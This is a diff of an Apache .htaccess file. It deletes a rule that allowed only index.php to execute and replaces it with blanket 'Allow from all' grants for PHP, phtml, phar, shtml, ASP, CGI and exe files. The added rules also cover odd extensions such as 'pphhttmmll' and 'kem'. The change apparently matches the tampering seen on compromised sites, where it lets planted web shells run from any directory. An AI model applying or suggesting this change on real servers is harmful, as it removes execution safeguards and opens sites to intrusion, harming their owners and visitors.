@@ -1,6 +1,43 @@
-<FilesMatch "\.php$">
 
-    <If "%{REQUEST_URI} =~ m#^/index\.php#">
-        Require all granted
-    </If>
+<Files *.php>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.phtml>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.pht>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.phar>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.shtml>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.aspx>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.asp>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files *.cgi>
+    Order Deny,Allow
+    Allow from all
+</Files>
+<Files ~ '\.(xml|cgi|phtml|pphhttmmll|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|phar|pht|pp|kem|exe|php7|ph|php5|php)$'>
+Allow from all
+Require all granted
+</Files>
+
+
+
+
+
 
